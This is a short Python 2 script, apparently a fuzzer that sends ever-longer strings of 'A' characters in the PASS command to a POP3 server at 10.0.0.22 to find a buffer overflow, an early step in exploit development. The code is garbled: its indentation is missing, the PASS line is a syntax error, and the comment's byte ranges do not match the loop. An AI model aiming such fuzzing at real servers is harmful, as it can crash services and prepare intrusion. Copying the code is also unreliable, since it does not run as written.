#!/usr/bin/python

#---------------#
#               #
#   u-N-i-k-s   #
#               #
#---------------#

import socket
#buff array [10-2000] in increments of 20

buffer=["A"]
counter=100

while len(buffer) <= 30:
buffer.append("A"*counter)
counter=counter+200

for string in buffer:
print "Fuzzing,PASS,with %s,bytes" % len(string)
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('10.0.0.22',110))
s.recv(1024)
s.send('USER,test\r\n')
s.recv(1024)
s.send('PASS,',+,string,+,'\r\n')
s.send('QUIT \r\n')
s.close()
